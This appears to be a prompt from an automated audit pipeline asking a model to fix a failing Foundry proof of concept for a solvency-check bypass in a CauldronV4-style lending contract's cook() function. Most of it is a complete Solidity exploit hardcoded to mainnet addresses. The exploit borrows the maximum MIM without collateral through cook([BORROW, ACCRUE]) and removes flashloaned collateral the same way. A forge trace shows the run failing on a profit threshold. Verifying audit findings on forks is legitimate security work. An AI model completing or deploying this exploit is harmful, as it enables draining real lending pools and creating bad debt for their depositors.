You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unsupported `cook` actions silently clear the deferred solvency check
- claim: `cook()` defers the post-action solvency check by setting `status.needsSolvencyCheck = true` after `ACTION_BORROW` and `ACTION_REMOVE_COLLATERAL`, but any unhandled action falls through to the base `_additionalCookAction()` implementation, which is an empty no-op returning a zero-initialized `CookStatus`. That overwrites the pending status and clears `needsSolvencyCheck`, so the final `require(_isSolvent(...))` is skipped entirely. The declared-but-unhandled `ACTION_ACCRUE` (`8`) is one such built-in bypass.
- impact: An attacker can borrow MIM or remove collateral through `cook()` without remaining solvent. This enables undercollateralized or fully uncollateralized debt up to the market's borrow caps and available MIM liquidity, creating immediate bad debt and potentially draining the pool.
- exploit_paths: ["Call `cook([ACTION_BORROW, ACTION_ACCRUE], ...)` so `_borrow()` transfers out MIM, then the unhandled second action resets `status` and the transaction exits without the final solvency check.", "Call `cook([ACTION_REMOVE_COLLATERAL, <any unsupported action>], ...)` to withdraw collateral and then erase the pending solvency check before the loop finishes."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(
        IFlashBorrowerLike borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
    function masterContractApproved(address user, address masterContract) external view returns (bool);
    function masterContractOf(address cloneAddress) external view returns (address masterContract);
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4Like {
    function BORROW_OPENING_FEE() external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function exchangeRate() external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function magicInternetMoney() external view returns (address);
    function masterContract() external view returns (address);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

error Infeasible(bytes32 reason);

contract FlawVerifier is IFlashBorrowerLike {
    address public constant TARGET = 0x289424aDD4A1A503870EB475FD8bF1D586b134ED;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ACCRUE = 8;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;

    bool internal _executed;
    uint256 internal _profitAmount;

    address public bentoBoxAddress;
    address public collateralToken;

    bool public borrowPathUsed;
    bool public removePathUsed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public postBorrowSolvent;
    uint256 public borrowedMimAmount;
    uint256 public borrowedMimShare;
    uint256 public flashCollateralAmount;
    uint256 public flashCollateralFee;
    uint256 public collateralShareAdded;
    uint256 public collateralShareRemoved;
    bytes32 public infeasibleReason;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _execute();
    }

    function execute() external {
        _execute();
    }

    function run() external {
        _execute();
    }

    function exploit() external {
        _execute();
    }

    function _execute() internal {
        if (_executed) {
            return;
        }
        _executed = true;

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        bentoBoxAddress = cauldron.bentoBox();
        collateralToken = cauldron.collateral();

        _attemptBorrowPath(cauldron);

        if (borrowPathUsed) {
            _attemptRemovePath();
        }

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        hypothesisValidated = borrowPathUsed;
        hypothesisRefuted = !borrowPathUsed;

        if (!borrowPathUsed && infeasibleReason == bytes32(0)) {
            infeasibleReason = keccak256(bytes("borrow-path-failed"));
        }
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        if (msg.sender != bentoBoxAddress) revert Infeasible(keccak256(bytes("bad-bento-callback")));
        if (sender != address(this)) revert Infeasible(keccak256(bytes("bad-flash-sender")));
        if (token != collateralToken) revert Infeasible(keccak256(bytes("bad-flash-token")));

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        flashCollateralAmount = amount;
        flashCollateralFee = fee;

        // Minimal public setup for the second exploit path: temporarily source a tiny amount of existing
        // on-chain collateral, add it, then remove it via cook([REMOVE_COLLATERAL, ACTION_ACCRUE]).
        _forceApprove(collateralToken, bentoBoxAddress, type(uint256).max);
        _approveCauldronMasterContractIfNeeded(bento, cauldron.masterContract());

        (, uint256 shareOut) = bento.deposit(collateralToken, address(this), address(this), amount, 0);
        if (shareOut == 0) revert Infeasible(keccak256(bytes("zero-collateral-share")));
        collateralShareAdded = shareOut;

        cauldron.updateExchangeRate();
        try bento.masterContractApproved(address(this), cauldron.masterContract()) returns (bool approved) {
            if (!approved) revert Infeasible(keccak256(bytes("master-not-approved")));
        } catch {}

        // Uses the regular collateral-setup path; the vulnerability demonstration is the subsequent
        // remove-collateral cook call that silently clears the deferred solvency check.
        try this._externalAddCollateral(shareOut) {} catch {
            revert Infeasible(keccak256(bytes("add-collateral-failed")));
        }

        if (!_tryRemoveCook(shareOut)) {
            revert Infeasible(keccak256(bytes("remove-path-failed")));
        }

        collateralShareRemoved = bento.balanceOf(collateralToken, address(this));
        if (fee != 0) revert Infeasible(keccak256(bytes("flash-fee-nonzero")));

        bento.withdraw(collateralToken, address(this), address(this), amount, 0);
        _safeTransfer(collateralToken, bentoBoxAddress, amount);
    }

    function _externalAddCollateral(uint256 share) external {
        if (msg.sender != address(this)) revert Infeasible(keccak256(bytes("self-call-only")));
        ICauldronV4Like(TARGET).cook(
            _singleActionArray(10),
            _singleZeroArray(),
            _singleBytesArray(abi.encode(int256(uint256(share)), address(this), false))
        );
    }

    function _attemptBorrowPath(ICauldronV4Like cauldron) internal {
        uint256 maxBorrowAmount = _maxBorrowableAmount(cauldron);
        if (maxBorrowAmount == 0) {
            infeasibleReason = keccak256(bytes("no-liquidity-or-borrow-cap"));
            return;
        }

        uint256[8] memory attempts = [
            maxBorrowAmount,
            (maxBorrowAmount * 99) / 100,
            (maxBorrowAmount * 95) / 100,
            (maxBorrowAmount * 90) / 100,
            maxBorrowAmount / 2,
            maxBorrowAmount / 4,
            maxBorrowAmount / 10,
            uint256(1)
        ];

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 candidate = attempts[i];
            if (candidate == 0) {
                continue;
            }
            if (_tryBorrowCook(candidate)) {
                borrowedMimAmount = candidate;
                borrowPathUsed = true;
                try cauldron.isSolvent(address(this)) returns (bool solventNow) {
                    postBorrowSolvent = solventNow;
                } catch {}
                return;
            }
        }

        infeasibleReason = keccak256(bytes("borrow-cook-reverted"));
    }

    function _attemptRemovePath() internal {
        uint256[4] memory flashAttempts = [uint256(1), uint256(10), uint256(100), uint256(1000)];
        for (uint256 i = 0; i < flashAttempts.length; i++) {
            try IBentoBoxLike(bentoBoxAddress).flashLoan(
                IFlashBorrowerLike(address(this)), address(this), collateralToken, flashAttempts[i], bytes("")
            ) {
                removePathUsed = true;
                return;
            } catch Error(string memory) {
                infeasibleReason = keccak256(bytes("remove-path-reverted"));
            } catch (bytes memory lowLevelData) {
                bytes32 reason = _decodeInfeasibleReason(lowLevelData);
                if (reason != bytes32(0)) {
                    infeasibleReason = reason;
                } else {
                    infeasibleReason = keccak256(bytes("remove-path-reverted"));
                }
            }
        }
    }

    function _tryBorrowCook(uint256 amount) internal returns (bool ok) {
        uint8[] memory actions = new uint8[](2);
        actions[0] = ACTION_BORROW;
        actions[1] = ACTION_ACCRUE;

        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encode(int256(amount), address(this));
        datas[1] = bytes("");

        try ICauldronV4Like(TARGET).cook(actions, values, datas) returns (uint256, uint256) {
            borrowedMimShare = IBentoBoxLike(bentoBoxAddress).toShare(MIM, amount, false);
            return true;
        } catch {
            return false;
        }
    }

    function _tryRemoveCook(uint256 share) internal returns (bool ok) {
        uint8[] memory actions = new uint8[](2);
        actions[0] = ACTION_REMOVE_COLLATERAL;
        actions[1] = ACTION_ACCRUE;

        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encode(int256(share), address(this));
        datas[1] = bytes("");

        try ICauldronV4Like(TARGET).cook(actions, values, datas) returns (uint256, uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _approveCauldronMasterContractIfNeeded(IBentoBoxLike bento, address masterContract) internal {
        bool approved;
        try bento.masterContractApproved(address(this), masterContract) returns (bool isApproved) {
            approved = isApproved;
        } catch {}

        if (!approved) {
            try bento.setMasterContractApproval(address(this), masterContract, true, 0, bytes32(0), bytes32(0)) {}
            catch {
                revert Infeasible(keccak256(bytes("approval-failed")));
            }
        }
    }

    function _maxBorrowableAmount(ICauldronV4Like cauldron) internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        uint256 availableShare = bento.balanceOf(MIM, TARGET);
        uint256 availableAmount = bento.toAmount(MIM, availableShare, false);
        if (availableAmount == 0) {
            return 0;
        }

        (uint128 totalCap, uint128 perAddressCap) = cauldron.borrowLimit();
        (uint128 elastic, uint128 base) = cauldron.totalBorrow();
        uint256 currentPart = cauldron.userBorrowPart(address(this));

        uint256 remainingTotal = totalCap > elastic ? uint256(totalCap - elastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotal == 0 || remainingPart == 0) {
            return 0;
        }

        uint256 fee = cauldron.BORROW_OPENING_FEE();
        uint256 partLimitedElastic;
        if (base == 0 || elastic == 0) {
            partLimitedElastic = remainingPart;
        } else {
            partLimitedElastic = (remainingPart * uint256(elastic)) / uint256(base);
        }

        uint256 grossBound = _min(availableAmount, _min(remainingTotal, partLimitedElastic));
        if (grossBound == 0) {
            return 0;
        }

        amount = (grossBound * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + fee);
        if (amount > 1e6) {
            amount -= 1e6;
        } else if (amount > 1) {
            amount -= 1;
        }
    }

    function _singleActionArray(uint8 action) internal pure returns (uint8[] memory arr) {
        arr = new uint8[](1);
        arr[0] = action;
    }

    function _singleZeroArray() internal pure returns (uint256[] memory arr) {
        arr = new uint256[](1);
    }

    function _singleBytesArray(bytes memory data) internal pure returns (bytes[] memory arr) {
        arr = new bytes[](1);
        arr[0] = data;
    }

    function _decodeInfeasibleReason(bytes memory data) internal pure returns (bytes32 reason) {
        if (data.length < 36) {
            return bytes32(0);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }

        if (selector != Infeasible.selector) {
            return bytes32(0);
        }

        assembly {
            reason := mload(add(data, 68))
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
x4d9a788Bc0801112fb8ad8fAAc5C4A00D02B2fF7::d6d7d525(00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   │   │   ├─ [86396] 0x13f193d5328d967076c5ED80Be9ed5a79224DdAb::d6d7d525(00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   │   │   │   ├─ [14594] 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [7098] 0x709783ab12b65fD6cd948214EEe6448f3BdD72A3::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f53395
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f53395
    │   │   │   │   │   │   │   ├─ [14594] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [7098] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f54c90
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f54c90
    │   │   │   │   │   │   │   ├─ [14594] 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [7098] 0x0d5F4aADf3fde31BBB55dB5F42C080F18aD54Df5::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f68822
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000005f68822
    │   │   │   │   │   │   │   ├─ [28696] 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7::bb7b8b80() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [2320] 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490::18160ddd() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000008ddd6653ae02e7b7e284f0
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e6e322943996997
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000d5a2adf862407f3
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000d5a2adf862407f3
    │   │   │   │   │   ├─  emit topic 0: 0x9f9192b5edb17356c524e08d9e025c8e2f6307e6ea52fb7968faa3081f51c3c8
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000d5a2adf862407f3
    │   │   │   │   │   └─ ← [Return] true, 962128609913604083 [9.621e17]
    │   │   │   │   └─ ← [Return] true, 962128609913604083 [9.621e17]
    │   │   │   ├─ [416] 0x289424aDD4A1A503870EB475FD8bF1D586b134ED::masterContract() [staticcall]
    │   │   │   │   ├─ [250] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::masterContract() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103
    │   │   │   │   └─ ← [Return] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103
    │   │   │   ├─ [819] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce::masterContractApproved(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103) [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   └─ ← [Revert] Infeasible(0xd6b0db680615f95cf1afb2d50f76eb7f23e305dfb00e260b4d5aeba43e8e28f8)
    │   │   └─ ← [Revert] Infeasible(0xd6b0db680615f95cf1afb2d50f76eb7f23e305dfb00e260b4d5aeba43e8e28f8)
    │   ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [245] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [414] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 23504544 [2.35e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6704)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.onFlashLoan
  at 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 9.97s (7.18s CPU time)

Ran 1 test suite in 9.99s (9.97s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2468822)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
